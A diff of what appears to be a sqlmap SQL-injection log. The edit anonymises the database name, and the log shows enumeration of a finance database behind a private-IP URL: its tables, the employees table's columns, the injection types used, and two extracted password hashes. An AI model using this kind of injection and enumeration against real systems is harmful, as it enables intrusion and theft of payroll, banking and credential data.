@@ -39,10 +39,10 @@ Parameter: user (GET)
 [06:15:35] [INFO] the back-end DBMS is MySQL
 [06:15:35] [INFO] fetching current database
 back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-current database: 'tadamun_finance'
+current database: 'corp_finance'
 
-[06:15:36] [INFO] fetching tables for database 'tadamun_finance'
-Database: tadamun_finance
+[06:15:36] [INFO] fetching tables for database 'corp_finance'
+Database: corp_finance
 [8 tables]
 +--------------------+
 | accounts           |
@@ -56,7 +56,7 @@ Database: tadamun_finance
 +--------------------+
 
 [06:15:40] [INFO] fetching columns for table 'employees'
-Database: tadamun_finance
+Database: corp_finance
 Table: employees
 [7 columns]
 +--------------+-------------------+
@@ -84,7 +84,7 @@ Table: employees
 
 SUMMARY:
   Target URL:    http://192.168.20.50:8080/app/user?user=admin
-  Database:      MySQL / MariaDB — tadamun_finance
+  Database:      MySQL / MariaDB — corp_finance
   Injection:     Error-based + Stacked Queries + Time-based Blind
   Tables found:  8 (including sensitive: employees, payroll, bank_transactions)
   Credentials:   2 password hashes extracted
